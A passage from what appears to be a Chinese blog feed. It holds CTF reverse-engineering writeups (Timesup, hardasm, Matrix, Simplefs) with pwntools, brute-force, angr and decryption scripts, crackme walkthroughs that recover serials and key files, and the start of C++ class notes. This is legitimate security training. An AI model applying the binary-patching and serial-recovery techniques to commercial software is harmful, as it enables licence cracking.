href="https://blog.csdn.net/zyhse/article/details/108026800?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_default&amp;utm_relevant_index=2">https://blog.csdn.net/zyhse/article/details/108026800?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_default&amp;utm_relevant_index=2</a></p><p>上面介绍了openssl的一些加密算法使用，下面这个是函数说明</p><p><a href="https://www.jianshu.com/p/3c59291f8f98">https://www.jianshu.com/p/3c59291f8f98</a></p><h1 id="SpaceHeroesCtf2022-Timesup"><a href="#SpaceHeroesCtf2022-Timesup" class="headerlink" title="SpaceHeroesCtf2022-Timesup"></a>SpaceHeroesCtf2022-Timesup</h1><p>进去就是输入三个数满足一个方程式</p><p>计算方法就不多说了，可以看这篇wp</p><p><a href="https://ctftime.org/writeup/32973">https://ctftime.org/writeup/32973</a></p><p>主要看第二个限制，可以看到这里有个限制应该是在16到17秒之间，但是wp里说的是17分，我自己写了代码发现第一个参数是秒，这里也有说明</p><p><a href="https://www.runoob.com/cprogramming/c-function-localtime.html">https://www.runoob.com/cprogramming/c-function-localtime.html</a></p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649157668565.png"></p><p>那么我们就需要借助工具来进行传送参数，需要pwntools</p><pre class="language-none"><code class="language-none">process是连接本地连接remote是连接远端的，格式t=remote('网址',端口)我们可以发送数据过去，也可以接受数据</code></pre><pre class="language-python" data-language="python"><code class="language-python">val = 0xa4c570a = 1b = (val * 7 - 4) // 2c = 1def testfunc(a, b, c):    return (a + b + c &lt;&lt; ((a % b) &amp; 0x1f)) // ((2 &lt;&lt; (a &amp; 0x1f) ^ 3) * c)result = testfunc(a, b, c)print(val)print(result, hex(result))print(hex(a), hex(b), hex(c))from pwn import *#s = process('./timesup')s = remote('0.cloud.chals.io', 26020)print(s.readuntil(b'&gt;&gt;&gt; ').decode())s.writeline('{} {} {}'.format(hex(a), hex(b), hex(c)).encode())s.interactive()</code></pre><p>直接贴代码吧，感觉需要系统学pwntools</p><h1 id="Hgame2022-week4-hardasm"><a href="#Hgame2022-week4-hardasm" class="headerlink" title="Hgame2022-week4-hardasm"></a>Hgame2022-week4-hardasm</h1><p>一打开有几千行的汇编代码，先定位到关键判断</p><p>可以看到有很多的比较+跳转，而跳转的位置都是error</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649300239189.png"></p><p>那么只需要保证不符合等于0即可</p><p>构造flag：hgame{12345678901234567890}动调</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649300476017.png" alt="比较内容"></p><p>可以看到只要输入正确，最后得到的值是0xFF，不正确则为0，可以采取爆破的方式爆破出flag</p><p>可以看到printf的参数是通过rcx传入的，所以我们可以patch程序，让他打印[rsp+70h+var_50]的值，而不是success或error</p><p> <img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1c8291f15811477c8fbbd7d6a480bca0.png" alt="asm-print"> </p><p>edit-&gt;patch Program-&gt;Assemble，不知道为什么KeyPatch改不了</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1649301043777.png"></p><h2 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h2><p> subprocess模块可以生成新的进程，连接到它们的input/output/error管道，同时获取它们的返回值</p><p>我们可以使用该模块进行爆破</p><pre class="language-python" data-language="python"><code class="language-python">import subprocessreal_flag="hgame{"#绝对正确的前6个字符cur_index=6#当前爆破的位置while cur_index&lt;32:    for i in range(32,128):#当前爆破的位置上的字符        real_flag_arr = [0] * 32        for j in range(len(real_flag)):#正确的先复制一下            real_flag_arr[j]=ord(real_flag[j])        real_flag_arr[cur_index]=i#设置当前爆破的位置上的字符        real_flag_arr_s="".join(chr(k) for k in real_flag_arr)#输入到程序中的字符串        #上面都是一些初始化        p = subprocess.Popen(["D:\\new\\AD\\game\\hgame2022\\week4\\hardasm.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)        p.stdin.write(real_flag_arr_s.encode())        p.stdin.close()#停止输入        out = p.stdout.read()        if len(out)&gt;cur_index:#判断程序打印出的0xFF的个数是否增加，增加则说明当前爆破的位置上的字符设置的是正确的，因为存储的内容为0时，printf不打印            real_flag+=chr(i)            cur_index+=1            print(real_flag)            break# hgame{r# hgame{ri# hgame{rig# hgame{righ# hgame{right# hgame{right_# hgame{right_y# hgame{right_yo# hgame{right_you# hgame{right_your# hgame{right_your_# hgame{right_your_a# hgame{right_your_as# hgame{right_your_asm# hgame{right_your_asm_# hgame{right_your_asm_i# hgame{right_your_asm_is# hgame{right_your_asm_is_# hgame{right_your_asm_is_g# hgame{right_your_asm_is_go# hgame{right_your_asm_is_goo# hgame{right_your_asm_is_good# hgame{right_your_asm_is_good!# hgame{right_your_asm_is_good!!# hgame{right_your_asm_is_good!!}# hgame{right_your_asm_is_good!!}</code></pre><p>代码来源-<a href="https://blog.csdn.net/weixin_45582916/article/details/122909419">https://blog.csdn.net/weixin_45582916/article/details/122909419</a></p><p>POpen参数说明</p><pre class="language-none"><code class="language-none">stdin stdout和stderr：stdin stdout和stderr，分别表示子程序的标准输入、标准输出和标准错误。可选的值有PIPE或者一个有效的文件描述符（其实是个正整数）或者一个文件对象，还有None。如果是PIPE，则表示需要创建一个新的管道，如果是None，不会做任何重定向工作，子进程的文件描述符会继承父进程的。另外，stderr的值还可以是STDOUT，表示子进程的标准错误也输出到标准输出。</code></pre><pre class="language-python" data-language="python"><code class="language-python">stdin.write()#输入stdin.close()#关闭输入stout.read()#获取输出</code></pre><h1 id="Foobarctf2022-Matrix"><a href="#Foobarctf2022-Matrix" class="headerlink" title="Foobarctf2022-Matrix"></a>Foobarctf2022-Matrix</h1><p>一道vm题+angr求解</p><p>vm分析部分</p><pre class="language-c" data-language="c"><code class="language-c">unsigned char opcode[124] = {    0x04, 0x0B, 0x1D, 0x1C, 0x1B, 0x1A, 0x04, 0x0A, 0x5A, 0x50, 0x4E, 0x5D, //先把mov后面四个进行异或，然后将异或后的值与我们的输入异或 0x00, 0x0A, 0x0B, 0x00, 0x00, 0x0A, //0x00存的是我们的输入 0x04, 0x0B, 0x2D, 0x2C, 0x2B, 0x2A, 0x04, 0x0A, 0x56, 0x69, 0x58, 0x49, 0x00, 0x0A, 0x0B, 0x00, 0x01, 0x0A, 0x04, 0x0B, 0x3D, 0x3C, 0x3B, 0x3A, 0x04, 0x0A, 0x5C, 0x6C, 0x08, 0x65,     0x00, 0x0A, 0x0B, 0x00, 0x02, 0x0A, 0x04, 0x0B, 0x4D, 0x4C, 0x4B, 0x4A, 0x04, 0x0A, 0x7A, 0x04, 0x2E, 0x15, 0x00, 0x0A, 0x0B, 0x00, 0x03, 0x0A, 0x04, 0x0B, 0x5D, 0x5C, 0x5B, 0x5A, 0x04, 0x0A, 0x30, 0x1C, 0x0F, 0x08, 0x00, 0x0A, 0x0B, 0x00, 0x04, 0x0A, 0x04, 0x0B, 0x6D, 0x6C, 0x6B, 0x6A,     0x04, 0x0A, 0x24, 0x14, 0x16, 0x6A, 0x00, 0x0A, 0x0B, 0x00, 0x05, 0x0A, 0x02, 0x00, 0x01, //将我们异或后的值|=其后面一个值 0x02, 0x00, 0x02, 0x02, 0x00, 0x03, 0x02, 0x00, 0x04, 0x02, 0x00, 0x05, 0xFF</code></pre><p>angr求解，因为最后的结果字符串存在GLUG，所以直接angr</p><pre class="language-python" data-language="python"><code class="language-python">import angrimport claripyimport sysproj = angr.Project("./matrix")#创建文件state = proj.factory.entry_state()simgr = proj.factory.simgr()simgr.run()if simgr.deadended:    for s in simgr.deadended:        tmp = s.posix.dumps(0)#获取最终结果        if b"glug" in tmp.lower():            print(tmp)</code></pre><p>不知道为啥只能在linux跑，在windows跑会报错</p><h1 id="CTF2022-Simplefs"><a href="#CTF2022-Simplefs" class="headerlink" title="*CTF2022-Simplefs"></a>*CTF2022-Simplefs</h1><p>根据附件里的描述，可以知道这是关键函数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367401948.png"></p><p>这三段都很类似，不同的在于这里传入的参数</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367476520.png"></p><p>进去看看，根据不同的参数产生不同的结果，然后写入</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367528880.png"></p><p>当传入2时，生成的是随机数，而且以时间为种子，所以我们不可逆</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367550826.png"></p><p>当传入1时，移位和异或操作，通过动调可以得到异或的值</p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367588110.png"></p><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>遍历文件所有字节流，进行解密，然后和*CTF比较，比对成功就打印其后面的32位</p><p>也可以先将*CTF进行加密，然后将得到的十六进制去加密的文件搜索，取出之后爆破即可（NU1L的题解就是爆破的）</p><p>下面贴一下我的脚本，调试了挺久emmm，太菜了</p><pre class="language-c" data-language="c"><code class="language-c">#define _CRT_SECURE_NO_WARNINGS#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;malloc.h&gt;#include&lt;stdlib.h&gt;#define FilePath "D:\\new\\AD\\game\\星ctf2022\\dcacb9c0054e4a4695b2f373f255ac8e\\image.flag"int main(){char xor_table[4] = { 0xEF,0xBE,0xED,0xDE };FILE* pfile = fopen(FilePath, "r");fseek(pfile, 0 , SEEK_END);int filesize = ftell(pfile);fseek(pfile, 0, SEEK_SET);unsigned char *Buffer = { 0 };Buffer = (unsigned char*)malloc(filesize);memset(Buffer, 0, filesize);fread(Buffer, filesize, 1, pfile);int j = 0;int i = 0;int count = 0;while (1){for (i=j;count&lt;32; ++i,count++){Buffer[i] = ((Buffer[i] &lt;&lt; 5) | (Buffer[i] &gt;&gt; 3)) &amp; 0xff;Buffer[i] ^= xor_table[3];Buffer[i] = ((Buffer[i] &lt;&lt; 4) | (Buffer[i] &gt;&gt; 4)) &amp; 0xff;Buffer[i] ^= xor_table[2];Buffer[i] = ((Buffer[i] &lt;&lt; 3) | (Buffer[i] &gt;&gt; 5)) &amp; 0xff;Buffer[i] ^= xor_table[1];Buffer[i] = ((Buffer[i] &lt;&lt; 2) | (Buffer[i] &gt;&gt; 6)) &amp; 0xff;Buffer[i] ^= xor_table[0];Buffer[i] = ((Buffer[i] &lt;&lt; 1) | (Buffer[i] &gt;&gt; 7)) &amp; 0xff;}if ((Buffer[j] == '*') &amp;&amp; (Buffer[j+1] == 'C') &amp;&amp; (Buffer[j+2] == 'T') &amp;&amp; (Buffer[j+3] == 'F')){for (int k = j; k &lt; 32+j; ++k){printf("%c", Buffer[k]);}break;}j += 32;count = 0;}//fclose(pfile);/*unsigned char Buffer[] = { 0x00,0xD2,0xFC,0xD8,0xA2 };for (int i = 0; i &lt; 5; ++i){Buffer[i] = ((Buffer[i] &lt;&lt; 5) | (Buffer[i] &gt;&gt; 3)) &amp; 0xff;Buffer[i] ^= xor_table[3];Buffer[i] = ((Buffer[i] &lt;&lt; 4) | (Buffer[i] &gt;&gt; 4)) &amp; 0xff;Buffer[i] ^= xor_table[2];Buffer[i] = ((Buffer[i] &lt;&lt; 3) | (Buffer[i] &gt;&gt; 5)) &amp; 0xff;Buffer[i] ^= xor_table[1];Buffer[i] = ((Buffer[i] &lt;&lt; 2) | (Buffer[i] &gt;&gt; 6)) &amp; 0xff;Buffer[i] ^= xor_table[0];Buffer[i] = ((Buffer[i] &lt;&lt; 1) | (Buffer[i] &gt;&gt; 7)) &amp; 0xff;}*/return 0;}</code></pre><p>要注意的是</p><blockquote><p><strong>BYTE是unsigned char型</strong></p></blockquote><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367843687.png"></p><p><img src="/2022/04/04/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/1650367884507.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crackme算法</title>
      <link href="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/"/>
      <url>/2022/04/03/Crackme%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>因为汇编太水了，所以决定做一下CrackMe练习，可能不会一直弄，精力有限</p><h1 id="0x01-笔记"><a href="#0x01-笔记" class="headerlink" title="0x01-笔记"></a>0x01-笔记</h1><blockquote><p> XCHG（交换数据）指令交换两个操作数内容 </p></blockquote><blockquote><p>mov和lea的区别</p><p>mov:当mov eax,[]表示将[]中地址存储的值存放到eax中，当然也可以直接mov地址到eax中，如mov eax,地址</p><p>lea:当lea eax,[]，表示将[]中的地址存放到eax中，相当于指针，主要是计算地址</p></blockquote><h1 id="002-abexcm5"><a href="#002-abexcm5" class="headerlink" title="002-abexcm5"></a>002-abexcm5</h1><p>首先先通过字符串引用定位到正确判断的位置</p><blockquote><p>调用函数前需要将参数压入堆栈中，并且靠前的参数后压入栈中</p></blockquote><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964360285.png" alt="正确判断"></p><p>接下来可以按x寻找调用位置，红色框中的就是跳转的位置</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964520801.png" alt="调用位置"></p><p>再往上找比较函数</p><p>可以看到这里调用了cmp函数，而且压入了两个参数，第一个是真正的注册码，第二个是我们的输入</p><blockquote><p>cmp:比较两个操作数，根据相减结果来改变零标志位，结果为0时，零标志位为1（Z位）</p><p>当第一位小于第二位时，S位为1</p></blockquote><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964586990.png" alt="比较函数"></p><p>寻找对注册码的操作</p><p>可以看到这里进行了两次拼接操作</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964780202.png" alt="两次拼接"></p><p>这个拼接的字符串是已知的，再看另一个</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964832766.png"></p><p>可以看到先通过GetVolumeInformationA获取驱动器信息，并生成字符串存储到aData4562Abex中，然后将字符串String2拼接到生成的字符串后</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648964910270.png" alt="aData4562Abex操作"></p><p>接下来重点讲讲ds段寄存器和重要的操作数</p><blockquote><p>ds:[地址]就相当于ds:地址，而且取出的是里面的内容，然后进行加一，</p><p>dec dl是dl的值–，并且除了CF标志位，其他都会改变。</p><p>dec dl对ZF标志位的影响，jnz跳转的条件是ZF==0，当dl的值为0时，设置ZF=1；否则设置为0</p><p>而一开始mov dl,2就是初始化迭代的次数，那么从mov到jnz这一段就是一个循环。</p></blockquote><p>总的加密就是取出aData字符串的前四位进行两次+1</p><p>所以我们还原一下过程即可得到注册码，但是我不明白GetVolumeInformationA生成的字符串，所以动调了</p><p>最后注册码L2C-5781Fcvc4562-ABEX</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648965721476.png" alt="注册成功"></p><h1 id="003-Cruehead-CrackMe-3"><a href="#003-Cruehead-CrackMe-3" class="headerlink" title="003-Cruehead-CrackMe-3"></a>003-Cruehead-CrackMe-3</h1><p>运行时发现是未cracked的</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648979391664.png" alt="运行时"></p><p>了解到这是需要KEY文件才能正确crack的，我们从头开始分析</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648980725152.png" alt="CreateFileA"></p><pre class="language-c" data-language="c"><code class="language-c">HANDLE CreateFileA(  [in]           LPCSTR                lpFileName,  [in]           DWORD                 dwDesiredAccess,  [in]           DWORD                 dwShareMode,  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,  [in]           DWORD                 dwCreationDisposition,  [in]           DWORD                 dwFlagsAndAttributes,  [in, optional] HANDLE                hTemplateFile);</code></pre><p>具体参数参考<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea">https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea</a></p><p>注意压入栈的顺序即可，这里根据参数应该是打开CRACKME3.KEY文件，如果没有的话返回值设置为-1</p><blockquote><p>返回值一般存储在eax寄存器中</p></blockquote><blockquote><p>CMP汇编指令会修改ZF和CF标志寄存器，如果相同的话设置ZF为1，否则为0</p></blockquote><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981137536.png" alt="跳转"></p><p>如果不相等，就跳转到401043，这里我们默认打开了</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981237587.png" alt="ReadFile"></p><p>可以看到先把0x12存入eax，把字符串地址放入ebx中</p><blockquote><p>offset存储的是字符串的地址</p></blockquote><p>接下来调用ReadFile读取文件内容，长度是0x12，位置是字符串地址存储的内容</p><pre class="language-c" data-language="c"><code class="language-c">BOOL ReadFile(    HANDLE hFile,            //文件的句柄    LPVOID lpBuffer,          //用于保存读入数据的一个缓冲区    DWORD nNumberOfBytesToRead,    //要读入的字节数    LPDWORD lpNumberOfBytesRead,    //指向实际读取字节数的指针    LPOVERLAPPED lpOverlapped    //如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。    //该结构定义了一次异步读取操作。否则，应将这个参数设为NULL);</code></pre><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981665617.png" alt="加密函数之一"></p><p>先来看加密函数的初始化操作</p><p>两个xor是将ecx和eax的值清空</p><p>将esp+arg_0存储的值赋值到esi中，也就是读取字符串的地址</p><blockquote><p>这里可以看到arg_0=DWORD 4，esp+4就是我们压入栈中的参数，因为call会让ESP往低地址移动</p></blockquote><p>再将0x41赋值给bl</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981700071.png" alt="初始化操作"></p><p>接下来看加密的操作，首先先将esi的存储的值看作地址，取出里面的内容放到al中，再将al异或上bl的值，再存放回原来的地址</p><blockquote><p>inc实现的是自增1</p></blockquote><p>esi存放的是地址，+1就相当于指针后移</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648981955860.png" alt="加密操作"></p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648982311802.png" alt="指针移动"></p><p>然后将异或后的结果加到ds:dword_4020F9存储的内容中</p><p>判断al的值是否为0，如果是的话，跳转到</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648982477054.png" alt="当al为0时跳转的地址"></p><p>接着就是cl++，然后判断bl的值是否为0x4F，因为初始时bl的值为0x41，所以加密数据的长度是0x4f-0x41</p><p>最后，函数loc_401335结束前把ecx的值存放到ds段寄存器地址的内容中</p><p>因为异或后相加的结果存储在dword_4020F9中，这里将它和0x12345678异或</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648982757718.png"></p><blockquote><p>add esp,4是因为call的时候将其下一条指令压入栈中，所以需要add esp,4</p></blockquote><p>接下来又将我们加密后的内容压入栈，进行下一个函数的操作</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648983002897.png" alt="第二轮操作"></p><p>先把esp+4存储的内容也就是存储字符串的首地址存放到esi中，然后esi+0xE，也就是地址后移0xE，再将其存储的值放入eax中，0x12-0xE=4，也就是将最后四个存放到eax寄存器中</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648983018786.png" alt="第二轮操作"></p><p>将最后四位与dword_4020F9，也就是刚才和0x12345678异或后的值比较</p><blockquote><p>setz al；如果ZF=1，则设置目标数为1，否则则为0</p><p>test al,al;如果al&amp;al==0，也就是al的值为0，那么ZF会被设置为1，否则则为0</p></blockquote><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648983201869.png" alt="比较"></p><p>接下来是一些创建窗口和弹出窗口的代码</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648983983571.png" alt="窗口代码"></p><p>看一下成功的部分代码</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984022368.png" alt="成功部分"></p><p>主要看一下这个</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984126580.png" alt="移动字符串"></p><blockquote><p> 即字符串传送指令，这条指令按字节传送数据。通过SI和DI这两个寄存器控制字符串的源地址和目标地址，比如DS:SI这段地址的N个字节复制到ES:DI指向的地址，复制后DS:SI的内容保持不变。 </p></blockquote><p>先把DWORD_402149，也就是前面说的加密的长度</p><p>也就是先把传入的两个参数的地址分别存入esi和edi中</p><p>而第一个参数也就是arg_0(后压入栈)，被存放到esi中</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984644479.png"></p><p>同时，第一个参数也是前面存放我们字符串的地址</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984708951.png"></p><p>然后edi指向的地址后移</p><p>再循环将esi的值存入edi中，循环次数为ecx的值</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648984226522.png"></p><p>这段话就是将我们最后加密的字符串拼接到Cracked By:后面</p><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p>先打开CRACKME3.KEY文件，读取前十八个字符，然后对前14个字符异或加密，并且将异或后的值和0x12345678异或后与最后四位进行比较，前十四个密文为<a href="mailto:wanao@yahoo.cn">wanao@yahoo.cn</a>，然后动调得到最后四位字符，填充进去即可，注意大小端序</p><p>前十四位字符脚本</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(){char name[]="wanao@yahoo.cn";char key='A';int num=0;for(int i=0;i&lt;strlen(name);++i){name[i]^=key++;num+=name[i];}printf("%s\n",name);printf("%d\n",num);int key2=0x12345678;return 0; } </code></pre><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648985143096.png" alt="最后四位字符"></p><p>最终效果</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1648985203991.png"></p><h1 id="004-Acid-Bytes-2"><a href="#004-Acid-Bytes-2" class="headerlink" title="004-Acid Bytes.2"></a>004-Acid Bytes.2</h1><p>upx壳，去掉后很快就能找到比较</p><h1 id="006-ArturDents-CrackMe-2"><a href="#006-ArturDents-CrackMe-2" class="headerlink" title="006-ArturDents-CrackMe#2"></a>006-ArturDents-CrackMe#2</h1><p>先找到成功的函数</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649033728711.png" alt="验证正确的函数"></p><p>然后找到关键比较</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649033782005.png" alt="关键函数和跳转"></p><p>根据程序运行知道我们需要输入name和序列号，找到获取输入的函数</p><pre class="language-c" data-language="c"><code class="language-c">UINT GetDlgItemTextA(  [in]  HWND  hDlg,  [in]  int   nIDDlgItem,  [out] LPSTR lpString,  [in]  int   cchMax);//返回值是字符串的长度</code></pre><p>lpstring就是我们的输入</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649034100647.png" alt="关键函数"></p><p>箭头处可以看到cmp esi,5，而前面将函数的返回值也就是eax的值存储到esi中，所以这是长度比较，可以看到jge下一段是说name长度必须大于5。</p><p>再看下面红色框，获取我们的输入密码后，将input和password的地址存放到eax和ebx中，再把esi也就是name的长度存入ecx中</p><p>看加密函数</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649034490927.png" alt="关键加密函数"></p><p>先把eax存储的值取出，然后减去cl的值，再与ebx存放的值作比较</p><p>下面那个跳转是跳转到离开的函数</p><p>inc是自增，也就是让寄存器指向password和input下一个字符</p><blockquote><pre class="language-c" data-language="c"><code class="language-c">    mov cx, 循环的次数 (当遇到Loop标号时 cx就代表循环的次数)标号: (标明后面就是需要循环的循环体)    循环执行的程序代码    Loop 标号//注意：每执行一次loop，ecx的值都会减1</code></pre></blockquote><p>每执行一次loop，ecx的值都会减1</p><p>所以注意这一点即可</p><h2 id="最终"><a href="#最终" class="headerlink" title="最终"></a>最终</h2><p>name为99999，序列号为45678即可满足</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649034817650.png" alt="成功"></p><h1 id="007-reg"><a href="#007-reg" class="headerlink" title="007-reg"></a>007-reg</h1><p>这是一个共享软件，打开时需要我们输入UserName和SN，然后生成reg.dll，再打开软件验证。</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040536751.png" alt="reg.dll内容"></p><p>先定位到关键的字符串</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040650078.png" alt="关键字符串"></p><p>定位过去</p><p>可以看到先把字符串也就是reg.dll移动到eax中，然后call，再对al进行验证，所以这个函数应该是打开这个文件，没有这个文件的话就返回0</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040684329.png"></p><p>接下来这一段应该是将dll文件的username和sn读取出来</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040844910.png" alt="读取函数"></p><p>可以看到先把刚才读取的username和sn存放到edx和eax中，然后调用函数，调用结束后进行test和跳转，所以这个函数应该是加密函数</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649040977142.png" alt="加密函数"></p><p>加密函数中，先将变量的值清0，并且将username和sn存放到第一个和第二个参数中</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649041483499.png"></p><p>往下看，这里先把第二个参数（序列号）的地址读取到eax中，然后返回值和0x10作比较，那么这段应该就是计算序列号的长度</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649041704450.png" alt="关键比较"></p><p>在函数出事的地方，可以看到var_8=-8，然后ebp-8就是存放的序列号</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042026513.png" alt="计算位置"></p><p>看一下函数调用的堆栈图，EBP+x就是压入的参数</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042190963.png" alt="堆栈图"></p><p>下面这一段应该是对序列号验证，因为sub会让标志寄存器改变</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042492337.png" alt="验证"></p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042642683.png"></p><p>FTSP汇编指令</p><p><a href="https://blog.csdn.net/liujiayu2/article/details/77711838">https://blog.csdn.net/liujiayu2/article/details/77711838</a></p><p>最后在这里的堆栈图找到了正确的序列号，长度正好是0x10</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042753681.png"></p><p>先把两个参数存放的内容以及第三个参数也就是var_10的地址存储到ecx中，那么这个应该就是正确的序列号</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649042840725.png" alt="在调用前面的函数前"></p><p>函数有点复杂，有时间再看，据说后面有md5</p><p><img src="/2022/04/03/Crackme%E7%AE%97%E6%B3%95/1649043390270.png" alt="ZF标志位"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++</title>
      <link href="/2022/03/31/C/"/>
      <url>/2022/03/31/C/</url>
      
        <content type="html"><![CDATA[<h1 id="C-类-this指针"><a href="#C-类-this指针" class="headerlink" title="C++类-this指针"></a>C++类-this指针</h1><h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><p>C语言中，结构体作为函数参数时传参传的是副本，而数组传递的是指针，所以我们将结构体作为参数时，最好传入指针</p><p>封装-就是将函数放入结构体内部，每次调用函数都会传递当前结构体的首地址，这样我们使用里面的变量就会比较方便</p><p>类-这个结构体就叫做类，在结构体插入函数时，结构体大小不变，因为函数不在结构体内部，可以看到sizeoftest=8，也就是两个int</p><p><img src="/2022/03/31/C/1648776748495.png"></p><p>对象-当使用使用类型创建变量时，创建的名称就叫做对象，比如Base base，Base是类，那么base就叫做对象</p><p>成员-里面的参数都是成员</p><p>成员函数-顾名思义，结构体中函数类型的成员</p><p><img src="/2022/03/31/C/1648776093255.png" alt="成员、类、对象"></p><h2 id="this指针"><a href="#this指针" class="headerlink" title="this指针"></a>this指针</h2><p>在反汇编中，调用类中的函数之前会先把结构体对象的首地址传入ecx中，ecx存放的值就是this指针，我们可以通过它来使用结构体成员，this-&gt;x,this-&gt;y(在类的函数中)，当函数参数和结构体变量同名时，使用this可以帮助编译器区分</p><p><img src="/2022/03/31/C/1648776666723.png" alt="调用类方法时的初始化操作"></p><p>我们知道指针可以进行加法减法操作，但是this指针不能进行这些操作，编译器不允许</p><h1 id="继承-构造-析构函数"><a href="#继承-构造-析构函数" class="headerlink" title="继承 构造-析构函数"></a>继承 构造-析构函数</h1><h2 id="构造函数"><a href="#构造函数" class="headerlink" 